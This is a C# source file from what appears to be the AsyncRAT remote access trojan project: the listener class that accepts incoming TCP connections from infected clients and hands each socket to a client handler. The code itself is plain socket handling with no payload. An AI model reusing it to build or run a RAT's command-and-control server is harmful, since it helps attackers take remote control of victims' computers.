using System.Threading.Tasks;
using System.Net;
using System.Net.Sockets;
using System;

namespace AsyncRAT_Sharp.Sockets
{
    class Listener
    {
        public TcpListener listener;

        public async void Connect(int port)
        {
            listener = new TcpListener(IPAddress.Any, port);
            listener.Server.ReceiveBufferSize = 50 * 1024;
            listener.Server.SendBufferSize = 50 * 1024;
            listener.Server.ReceiveTimeout = -1;
            listener.Server.SendTimeout = -1;
            listener.Start();

            while (true)
            {
                await Task.Delay(1);
                if (listener.Pending())
                {
                    listener.BeginAcceptSocket(EndAccept, null);
                }
            }
        }

        public void EndAccept(IAsyncResult ar)
        {
            try
            {
                Clients CL = new Clients();
                CL.InitializeClient(listener.EndAcceptSocket(ar));
            }
            catch
            {
            }
        }
    }
}
